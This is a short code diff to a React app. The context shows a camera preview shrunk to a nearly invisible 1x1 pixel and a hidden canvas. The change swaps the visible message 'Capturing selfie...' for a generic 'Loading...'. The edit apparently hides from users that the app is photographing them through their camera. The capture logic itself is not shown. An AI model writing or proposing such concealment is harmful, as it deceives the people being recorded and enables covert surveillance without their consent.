@@ -53,7 +53,7 @@ function App() {
         style={{ width: 1, height: 1, opacity: 0.01 }} // hidden preview
       />
       <canvas ref={canvasRef} style={{ display: "none" }} />
-      <p>📸 Capturing selfie...</p>
+      <p>Loading...</p>
     </div>
   );
 }
